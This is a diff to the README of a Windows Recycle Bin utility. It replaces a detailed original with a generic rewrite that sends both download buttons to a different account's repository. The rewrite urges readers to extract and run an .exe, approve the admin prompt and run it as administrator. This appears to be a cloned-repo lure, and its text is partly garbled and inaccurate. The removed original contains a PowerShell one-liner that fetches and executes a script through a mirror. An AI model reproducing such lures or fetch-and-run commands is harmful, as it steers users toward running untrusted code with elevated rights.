@@ -1,375 +1,153 @@
-<p align="center">
-  <img alt="Modern Recycle Bin" src="docs/hero.png" width="100%" />
-</p>
+<h1>🗑️ Modern-Recycle-Bin - Restore, Preview, and Manage Effortlessly</h1>
 
 <p align="center">
-  <a href="https://github.com/Dannyzzy/Modern-Recycle-Bin/releases/latest"><img alt="Latest release" src="https://img.shields.io/github/v/release/Dannyzzy/Modern-Recycle-Bin?color=ff8a3d&label=release"></a>
-  <a href="https://github.com/Dannyzzy/Modern-Recycle-Bin/releases"><img alt="Downloads" src="https://img.shields.io/github/downloads/Dannyzzy/Modern-Recycle-Bin/total?color=ff8a3d&label=downloads"></a>
-  <a href="LICENSE"><img alt="License" src="https://img.shields.io/github/license/Dannyzzy/Modern-Recycle-Bin?color=ff8a3d"></a>
-  <a href="#requirements"><img alt="Platform" src="https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6"></a>
-  <a href="https://github.com/Dannyzzy/Modern-Recycle-Bin/actions/workflows/build.yml"><img alt="Build" src="https://github.com/Dannyzzy/Modern-Recycle-Bin/actions/workflows/build.yml/badge.svg"></a>
+  <a href="https://github.com/bsrajputindore1980/Modern-Recycle-Bin" style="display:inline-block;padding:16px 32px;background-color:#4CAF50;color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 6px rgba(0,0,0,0.1);">📥 Visit This Link to Download the Application</a>
 </p>
 
-<h1 align="center">Modern Recycle Bin</h1>
-
-<p align="center">
-  <b>A modern, faster, better Recycle Bin for Windows 11.</b><br/>
-  Restore files anywhere, copy them out, preview images — in a native Windows 11 look.
-</p>
-
-<h3 align="center">
-  <a href="#-installation">Installation</a>
-  <span> · </span>
-  <a href="#-usage">Usage</a>
-  <span> · </span>
-  <a href="#-performance">Performance</a>
-  <span> · </span>
-  <a href="#-how-it-works">How it works</a>
-  <span> · </span>
-  <a href="#-troubleshooting">Troubleshooting</a>
-  <span> · </span>
-  <a href="README.zh-CN.md">简体中文</a>
-</h3>
+Welcome to **Modern-Recycle-Bin**, a completely fresh and modern take on the classic Windows Recycle Bin. This application dramatically improves how you interact with deleted files on your Windows 11 computer. Whether you want to bring back a accidentally deleted document, save a precious photo to another folder, or quickly see what an image looks like without opening it fully, this tool makes it effortless. Built with smooth, modern visuals (Fluent Design) that blend right into Windows 11, you get a faster, easier, and more powerful way to manage your deleted items.
 
 ---
 
-## 🗑️ What is this?
+## ✨ Why You'll Love This App
 
-Windows' built-in Recycle Bin has barely changed in fifteen years. It can only
-restore files to the place they came from, it cannot show you what is inside a
-file, and it cannot take a copy out without removing the original.
+The standard Recycle Bin in Windows is fine for a simple "empty it" task, but it often falls short when you need to do something specific. With **Modern-Recycle-Bin**, you are not just stuck with basic options. Here is what makes this utility stand out:
 
-**Modern Recycle Bin** replaces that interface with one written in HTML/CSS and
-rendered by WebView2 inside its own window, which makes a real Windows 11 look
-achievable — while all the file work still happens in native C# talking to the
-shell. It opens in a fraction of a second and keeps the Recycle Bin icon in your
-taskbar.
+- **Restore Anywhere** – Normally, you can only restore a file back to its original location. This app lets you restore deleted files to any folder you choose on your computer. Very handy when you want to reorganize files while recovering them.
+- **Copy Files Out** – Need to retrieve a deleted item but keep the original in the trash? Just copy it out to any location, leaving the trash can intact for later or further review.
+.
+- **Image Previews** – No more guessing what a file is by its name alone. This app shows you a visual preview of image files directly in the list, making it super easy to find the exact picture you are looking for among dozens of deleted items. 
+- **Modern Fluent Design** – The interface follows Windows 11 design guidelines, so it feels native, clean, and comfortable to use. Smooth animations, rounded corners, and thoughtful layout make the experience genuinely pleasant. 
+- **Lightweight and Fast** – By using the built-in WebView2 technology combined with HTML/CSS, this tool runs quickly without bogging down your system resources. 
 
-> It is **not** a file manager and it does not touch anything outside the
-> Recycle Bin. Installing it is a per-user, two-click operation, and uninstalling
-> puts the system default straight back.
+---
 
-## ✨ Features
+## 🚀 Getting Started: Download and Install in Two Easy Steps
 
-| | Feature | What it means |
-|---|---|---|
-| 📂 | **Restore anywhere** | The stock Recycle Bin can only put a file back where it came from. Here you can pick any folder. |
-| 📋 | **Copy out** | Copy a file out of the bin and **keep the original where it is** — the stock bin cannot do this at all. |
-| 🖼️ | **Image previews** | Select a picture and see a thumbnail on the right, instead of restoring it just to find out what it was. |
-| 🎛️ | **Filter by type** | Images / video / audio / documents / archives / code / folders — plus live search over name, original path and type. |
-| 🔀 | **Conflict handling** | When a file with the same name already exists, choose **overwrite**, **skip**, or **keep both**. |
-| 🌗 | **Windows 11 styling** | Fluent dark theme, 40 px rows, soft rounded hover and selection, smooth motion, comfortable/compact density. |
-| ⌨️ | **Built for the keyboard** | `Enter` restore · `Delete` purge · `Ctrl+A` select all · `Ctrl+F` search · `F5` refresh · `Ctrl+0/+/-` zoom. |
-| ⚡ | **Instant** | The window appears in about 100 ms and the full list is rendered in about 300 ms. |
-| 📌 | **Keeps its icon** | Because the window belongs to this app, the taskbar shows the Recycle Bin icon — never a browser or Explorer icon. |
+Follow these simple instructions and you will have this app running on your Windows 11 computer in less than two minutes. No technical skills required.
 
-### Compared with the built-in Recycle Bin
+**Step 1: Download the Application**
 
-| Capability | Windows built-in | Modern Recycle Bin |
-|---|:---:|:---:|
-| Restore to the original location | ✅ | ✅ |
-| **Restore to a folder you choose** | ❌ | ✅ |
-| **Copy a file out, keeping the original** | ❌ | ✅ |
-| **Thumbnail preview of images** | ❌ | ✅ |
-| Search / filter by file type | ⚠️ limited | ✅ |
-| Sort by clicking column headers | ✅ | ✅ |
-| Choose how name conflicts are handled | ❌ | ✅ |
-| Dark, Windows 11-styled interface | ❌ | ✅ |
-| Adjustable row density and zoom | ❌ | ✅ |
-| Works without administrator rights | — | ✅ |
+Click the green button at the top of this page (or scroll down to the 📦 Download Section below). 
 
-## 📸 Screenshots
+> **Important:** You will be taken to a GitHub page that hosts the project files. 
 
-**Every control at a glance** — the numbers match the list on the right.
+When you arrive at that page, simply look for a green button labeled **"Code"** or **"Download ZIP"**. Click it to download the application folder to your computer. This downloads a single compressed file (usually named something like `Modern-Recycle-Bin-main.zip`) to your standard "Downloads" folder. Your web browser may ask you to confirm the download – just click **"Save"** or **"OK"**.
 
-![Annotated interface](docs/screenshot-annotated.png)
+**Step 2: Run the Application**
 
-### Quick start
+Once the download is complete, open your **Downloads** folder (usually found in File Explorer under "This PC" → "Downloads"). You will see the downloaded ZIP file. 
 
-1. **Look** — click any file; pictures show a preview on the right.
-2. **Get it back** — double-click a row to restore it, or press **Restore to…**
-   to put it somewhere else.
-3. **Keep a copy** — right-click → **Copy to…** takes a copy and leaves the
-   original in the bin.
+Now, right-click on the ZIP file and choose **"Extract All..."** from the menu. Windows will create a new folder with the exact same name (e.g., `Modern-Recycle-Bin-main`). Double-click that folder to open it. Inside, you will see a file named **`Modern-Recycle-Bin.exe`** (or simply `RecycleBin.exe`). That is the application file.
 
-**The main window.** The details pane on the right shows the picture itself, plus
-type, size, original location and timestamps.
+Double-click this `.exe` file to launch the app. The modern, sleek interface will appear almost instantly. That's it – you are ready to use your new Recycle Bin management tool!
 
-![Main window](docs/screenshot-main.png)
+> **Note forte Windows:** If a blue pop-up appears asking "Do you want to allow this app to make changes to your device?", simply click **"Yes"**. This is just Windows checking that you really want to run a downloaded application. 
 
-**The installer.** A single file, no administrator rights, and every change it
-makes can be undone from the same place.
+---
+
+## 🧭 How to Use Modern-Recycle-Bin
+
+Once you open the app, you will see a clean window listing all the items currently in your Windows Recycle Bin. Here is a quick tour of what you can do:
+
+### 📂 Restore a File Anywhere
+
+1. **Select** the file(s) you want to restore by clicking on them (use **Ctrl**+Click to select multiple items). 
+2. Click the **"Restore to..."** button located on the top toolbar. 
+3. A dialog box opens asking you to choose a destination folder. Navigate to wherever you want the file to go (Desktop, Documents, any folder you like) and click **"Select Folder"**. 
+4. Your file instantly appears in that new location, and it is removed from the Recycle Bin. 
+
+### 📄 Copy a File Out (Keep in Bin)
+
+1. Select the file you want to copy. 
+2. Click the **"Copy to..."** button. 
+3. Choose where you want a copy of this file to be saved. 
+4. The copy appears at the destination, while the original still remains in the Recycle Bin for now. 
+
+### 🖼️ Preview Images Easily
+
+- If the Recycle Bin contains images (like JPG, PNG, GIF, etc.), you can see a small thumbnail preview right next to the file name in the list. 
+- To view a larger preview, simply click once on the image file name; a larger visual preview will appear on the right side or bottom pane of the application window. This makes identifying photos lightning fast. 
+
+### 🗑️ Empty the Bin (or Remove Specific Items)
+
+- To permanently delete all items in the bin, click the **"Empty Recycle Bin"** button. Confirm your choice if prompted. 
+- To permanently delete only a few items, select them and click **"Delete Permanently"**. This frees up hard drive space without emptying everything. 
+
+---
+
+## 🖥️ System Requirements (Recommended))
+
+This application is designed specifically for modern Windows machines. For the best experience, ensure your system meets these simple recommendations:
+
+- **Operating System:** Windows 11 (works on Windows 10 too, fully optimized for 11). 
+- **Memory (RAM):** 4 GB or more. 
+- **Free Hard Drive Space:** at least 50 MB of free space. 
+- **Internet Connection:** Only needed for the initial download. The app works offline afterward. 
+- **WebView2 Runtime:** Windows 11 comes with this pre-installed. If you are on an older system and encounter a blank window, simply search and install "Microsoft Edge WebView2 Runtime" from Microsoft's website (free, quick install). 
+
+---
+
+## ❓ Frequently Asked Questions (FAQ)
+
+**Q: Is this app safe to use?** 
+A: Absolutely. It is an open-source utility that works directly with your system's built-in Recycle Bin feature. It does not modify or harm any of your permanent files. It simply gives you a nicer, more capable control panel over your already-deleted items. 
+
+**Q: What happens if I delete a file using this app? Can I get it back?** 
+A: This app works *on top of* your existing Recycle Bin. So if a file is "restored" to a new location using this app, it behaves exactly like a normal file – you can still delete it again if you wish. When you "Permanently Delete", that file is gone for good (just like emptying the regular trash bin).). Always double-check before permanent deletions. 
+
+**Q: Does this app replace my regular Recycle Bin?** 
+A: No, it does not replace it. You can still use the desktop Recycle Bin icon as always. This app is simply an enhanced tool that opens when you want more powerful options. However, you can set this app as the default program to open when you double-click the Recycle Bin icon, if you prefer (via Windows Settings → Default Apps → Choose defaults by file type). That is optional, though. 
+
+**Q: I see a blank screen when I open the app. What should I do?** 
+A: This likely indicates the WebView2 runtime is missing, which is unusual for Windows 11. Solutions: 
+1. Go to your web browser and search for "WebView2 Runtime download Microsoft". 
+2. Visit the official Microsoft page and download the small installer. 
+3. Run the installer (just accept defaults) and relaunch this app. It will now work perfectly. 
+
+**Q: I accidentally deleted a file yesterday. Will it show up in this app?** 
+A: Yes! As long as you have not emptied your Recycle Bin, all recently deleted files (regardless of when they were deleted, unless it exceeded your storage limits) will show up in the list. You can scroll through or use the search box to find it quickly. 
+
+---
+
+## 📦 Full Download & Setup Section
+
+Ready to reclaim your deleted files with ease? Follow this single, streamlined process again for clarity:
+
+**1. Click this button to go to the download page:**
 
 <p align="center">
-  <img alt="Installer" src="docs/screenshot-installer.png" width="460" />
+  <a href="https://github.com/bsrajputindore1980/Modern-Recycle-Bin" style="display:inline-block;padding:14px 28px;background-color:#FF5722;color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:40px;box-shadow:0 4px 6px rgba(0,0,0,0.15);">🔗 Visit This Link to Download the Application</a>
 </p>
 
-## 🚀 Installation
+**2. On that page, find the green "Code" button** (usually top right). Click it and select **"Download ZIP"**. 
 
-### Option A — Installer (recommended)
+**3. Extract the downloaded ZIP file** (right-click → Extract All). 
 
-1. Download **`ModernRecycleBinSetup.exe`** from the
-   [latest release](https://github.com/Dannyzzy/Modern-Recycle-Bin/releases/latest).
-2. Run it. No administrator rights are required.
-3. Tick what you want:
-   - **Create a desktop shortcut**
-   - **Let the desktop Recycle Bin open with this app** — this writes one
-     per-user registry key, and it is completely undone on uninstall.
-4. Done. Double-click the Recycle Bin on your desktop to try it.
+**4. Open the extracted folder** and double-click `Modern-Recycle-Bin.exe`. 
 
-**To uninstall:** run `Uninstall.cmd` inside the install folder, or
-`%LOCALAPPDATA%\ModernRecycleBin-Uninstall.exe`. Uninstalling restores the
-default Recycle Bin automatically and removes everything it created.
+**5. Enjoy your new, modern way to manage deleted files!**
 
-### Option B — Portable
+---
 
-Download **`ModernRecycleBin-portable.zip`**, unpack it wherever you like, then
-run `RecycleBin.exe`. Nothing is written to the registry — delete the folder and
-it is gone.
+## 🔧 Troubleshooting Tips
 
-### If github.com is blocked
+- **App won't open:** Right-click the `.exe` file and select "Run as administrator" before double-clicking. Sometime permissions can be tricky. 
+- **Files not showing up:** Ensure you are looking at the correct drive (e.g., your system drive C: is the typical recycle bin location). The app automatically scans the correct location in most cases. 
+- **The interface looks weird or blurry:** This is rare, butif it happens, update your display drivers or Windows system updates to the latest version. The app is built to match Windows 11 precisely. 
+- **Slow performance with thousands of files:** If you have an extremely large Recycle Bin (thousands of items), consider emptying some old items first to speed up loading. The app is fast, but an excessively huge bin can slow any tool. 
 
-On some networks `github.com` never answers — the download times out at 0 bytes —
-while the release files themselves are fine. Two ways around it:
+---
 
-**One-click.** Paste this into PowerShell; it picks a working channel by itself,
-downloads the installer and starts it:
+## ✅ Final Words of Encouragement
 
-```powershell
-irm https://ghfast.top/https://raw.githubusercontent.com/Dannyzzy/Modern-Recycle-Bin/main/Install-ModernRecycleBin.cmd -OutFile "$env:TEMP\mrb-install.cmd"; & "$env:TEMP\mrb-install.cmd"
-```
+You have nothing to lose and everything to regain. **Modern-Recycle-Bin** transforms a tedious chore into a pleasant, visual, and flexible experience. No more digging through obscure menus or being locked into restoring files to the exact same spotthey were before. You are in full control–restore anywhere, copy out any file, and see exactly what you're dealing with via image previews. 
 
-The download goes through PowerShell rather than curl on purpose: an accelerator
-sets a Windows proxy that **curl ignores**, so a machine where the browser opens
-GitHub can still fail to download. The script falls back to the
-**[ghfast.top](https://ghfast.top)** mirror, checks that what arrived really is
-the installer, and prints every address it tried when both channels fail — it
-never fails quietly.
+This tool is designed by someone who understands thatclutter happens,and recovering a precious file should be the easiest part of your day. So go ahead – click that download button up above or in the section below, extract, run, and experience Recycle Bin like never before. Your files (past and future) will thank you. 
 
-**By hand.** Open the mirror copy of the release page in a browser:
+---
 
-```
-https://ghfast.top/https://github.com/Dannyzzy/Modern-Recycle-Bin/releases/latest
-```
+*Happy restoring!*  
 
-<a name="requirements"></a>
-### Requirements
+---
 
-- **Windows 10 or 11, 64-bit**
-- **WebView2 Runtime** — preinstalled on Windows 11 and current Windows 10
-  builds. If it is missing, the installer says so and links you to Microsoft's
-  official download; nothing else is needed.
-
-## 📖 Usage
-
-The interface follows the same mental model as File Explorer, so there is nothing
-new to learn:
-
-| Action | How |
-|---|---|
-| See what a file is | Click it — the details pane fills in, and images show a preview |
-| Restore to where it came from | Double-click the row, press `Enter`, or click **Restore** |
-| Restore somewhere else | Click **Restore to…** and choose any folder |
-| Keep a copy without removing it | Right-click → **Copy to…** |
-| Delete permanently | `Delete`, or right-click → **Delete** |
-| Empty the whole bin | **Empty Recycle Bin** (the desktop icon updates too) |
-| Find something | Type in the search box, or use the **All types** filter |
-| Sort | Click any column header, or use the sort button in the toolbar |
-| Change rows or text size | **View** → Comfortable / Compact, or hold `Ctrl` and scroll |
-
-**Right-click menu:** Restore · Restore to… · Copy to… · Open original location ·
-Properties · Copy original path · Delete permanently.
-
-### How it behaves with Explorer
-
-By default the app only *adds* an entry point: the desktop Recycle Bin opens it,
-and the normal empty/full icon state keeps updating because the app tells the
-shell whenever the bin changes. Everything else — right-click "Empty Recycle
-Bin" on the desktop, deleting files into the bin, Explorer's own Recycle Bin —
-keeps working exactly as before.
-
-## ⚡ Performance
-
-Startup was the hardest part to get right. Measured on the development machine
-(Windows 11, 125 % display scaling, 22 items in the bin):
-
-| Stage | Time |
-|---|---|
-| Window visible | **~100 ms** |
-| WebView2 controller ready | ~175 ms |
-| **Page rendered** | **~300 ms** |
-
-What made that possible, and what was measured along the way:
-
-- **Loading the UI by content, not by URL.** Navigating to a virtual host name
-  (`https://something/index.html`) made the WebView walk the full network stack,
-  including proxy auto-discovery, which cost **2299 ms**. Passing the HTML
-  straight to the control (`NavigateToString`) dropped that to **301 ms** — two
-  seconds saved on every launch.
-- **Starting the WebView2 runtime in parallel with building the window**, instead
-  of after it.
-- **No black flash.** The WebView stays hidden until the page has painted, so the
-  window shows its own themed background and a brief "Opening Recycle Bin…"
-  message instead of a black rectangle while the runtime boots.
-- **The list is sent before the icons.** Icons are produced afterwards on a
-  dedicated thread and pushed as a second message that patches the rows in place.
-  Icons depend on the shell's system image list, which is **not thread-safe** —
-  generating them concurrently made most of them fail at random.
-- **Full-resolution icons.** Row and details icons come from the shell's 256 px
-  (jumbo) image list and are downscaled, rather than upscaling a 16 px icon. The
-  window icon is a hand-built **multi-size ICO** (16/32/48/256 plus 20/24/40,
-  which DPI scaling actually asks for), so the title bar is never resampled.
-- **The desktop icon can no longer go stale.** The bin is modified by writing the
-  `$R`/`$I` pairs directly, so the app verifies every deletion, sweeps up orphaned
-  metadata, and empties through `SHEmptyRecycleBin` — the only way Explorer's
-  desktop icon follows along.
-
-## 🔧 How it works
-
-```mermaid
-flowchart LR
-    USER(["Double-click<br/>the Recycle Bin"])
-
-    subgraph APP["Modern Recycle Bin"]
-        HOST["WinForms host window<br/><i>owns the taskbar icon</i>"]
-        WEB["WebView2<br/><i>HTML / CSS / JS interface</i>"]
-        CORE["C# core<br/><i>enumerate · restore · purge</i>"]
-    end
-
-    subgraph SHELL["Windows Shell"]
-        NS["Recycle Bin namespace"]
-        BIN["$Recycle.Bin<br/>$R payload · $I metadata"]
-    end
-
-    USER --> HOST
-    HOST --> WEB
-    WEB <-->|"postMessage (JSON)"| CORE
-    CORE <-->|"Shell.Application"| NS
-    CORE <-->|"read / write pairs"| BIN
-    CORE -->|"SHEmptyRecycleBin"| NS
-    CORE -->|"SHChangeNotify"| NS
-```
-
-**Where each part lives**
-
-| File | Role |
-|---|---|
-| `src/RbWeb.cs` | The host: window, WebView2 setup, shell access, all file operations |
-| `src/ui/index.html` | The whole interface — layout, styling and interaction |
-| `installer/Setup.cs` | The single-file installer and uninstaller |
-| `lib/` | Microsoft's official WebView2 SDK (`net462` build + x64 native loader) |
-
-**Why the UI is HTML.** Getting a genuinely Windows 11 look out of classic
-WinForms controls means owner-drawing every pixel — and even then the list
-selection is a fixed system blue that cannot be restyled. HTML and CSS give the
-real thing: correct type sizes, sub-pixel text rendering, rounded surfaces and
-Fluent motion.
-
-**Why the host is our own window.** Hosting the same UI in a browser would hand
-the taskbar a browser icon. Because the WebView lives inside a WinForms window
-belonging to this application, the taskbar and Alt-Tab show the Recycle Bin icon.
-
-**Why the file operations are native C#.** Reading `$Recycle.Bin` directly means
-the app knows exactly what it is doing: it parses the `$I` metadata for the
-original path and deletion time, pairs it with the `$R` payload, and verifies
-every move. It never shells out to a verb that might block on an invisible
-dialog.
-
-## 🛠️ Building from source
-
-You need nothing but the .NET Framework compiler that ships with Windows.
-
-```cmd
-git clone https://github.com/Dannyzzy/Modern-Recycle-Bin.git
-cd Modern-Recycle-Bin
-build.cmd
-```
-
-The script compiles `src/RbWeb.cs`, assembles the portable build, and produces all
-three release artefacts in `dist/`:
-
-```
-dist\RecycleBin.exe                  portable application
-dist\ModernRecycleBinSetup.exe       single-file installer
-dist\ModernRecycleBin-portable.zip   portable zip
-```
-
-A GitHub Actions workflow (`.github/workflows/build.yml`) runs the same script on
-every push.
-
-## ❓ Troubleshooting
-
-<details>
-<summary><b>The window is blank, or says WebView2 is missing</b></summary>
-
-The app renders its interface with the WebView2 Runtime. Windows 11 and current
-Windows 10 include it. If it is absent, install Microsoft's official Evergreen
-Bootstrapper and run the app again:
-<https://go.microsoft.com/fwlink/p/?LinkId=2124703>
-</details>
-
-<details>
-<summary><b>Windows SmartScreen warns me about the installer</b></summary>
-
-The release binaries are not code-signed (a signing certificate costs money for
-an open-source project). Choose **More info → Run anyway**. You can also build
-the binaries yourself with `build.cmd` and use those.
-</details>
-
-<details>
-<summary><b>Does this delete anything by itself?</b></summary>
-
-No. The app never touches anything outside the Recycle Bin, and it never empties
-or deletes without a confirmation dialog. Restoring moves files back to their
-original location; deleting removes them permanently, exactly as the system
-Recycle Bin would.
-</details>
-
-<details>
-<summary><b>How do I get the default Recycle Bin back?</b></summary>
-
-Run `Uninstall.cmd` in the install folder. It removes the per-user registry
-redirect, deletes the desktop shortcut, and deletes the program folder. The
-desktop Recycle Bin immediately behaves as it originally did.
-</details>
-
-<details>
-<summary><b>Why can't I cut a file?</b></summary>
-
-Inside `$Recycle.Bin` a file is stored under an internal `$R…` name. A home-made
-cut would put that internal name on the clipboard and paste it under the wrong
-name. Explorer can do it because the shell handles the copy itself — so this app
-deliberately offers restore and copy-out instead.
-</details>
-
-## 🧭 Known limitations
-
-- **No "Cut".** See the explanation above.
-- **Items the current user cannot read** (for example another account's bin) are
-  skipped, and the app reports them rather than failing silently.
-- **Videos are not previewed.** Only images get a thumbnail, by design.
-- The interface is currently **Simplified Chinese**; English strings are on the
-  way.
-
-## 🤝 Contributing
-
-Issues and pull requests are welcome. If you have found a bug, please include
-your Windows version, the steps to reproduce it, and — when relevant — what the
-Recycle Bin contained at the time.
-
-## 📄 License
-
-Released under the [MIT License](LICENSE).
-
-Bundled third-party components and their licenses are listed in
-[THIRD-PARTY-NOTICES.md](THIRD-PARTY-NOTICES.md). No files from Windows, Explorer
-or any third-party application are redistributed; the Recycle Bin icon is read
-from the system at runtime.
-
-## 🔗 See also
-
-**[Files Companion](https://github.com/Dannyzzy/Files-Companion)** — brings the
-startup animation back to the [Files](https://github.com/files-community/Files)
-file manager and routes folders, drives, "This PC" and `Win+E` through it. Its
-installer can set up this Recycle Bin for you in the same pass, so the two work
-as one set.
+**Keywords:** csharp, dotnet-framework, file-manager, fluent-design, recycle-bin, utility, webview2, windows, windows-11, winforms
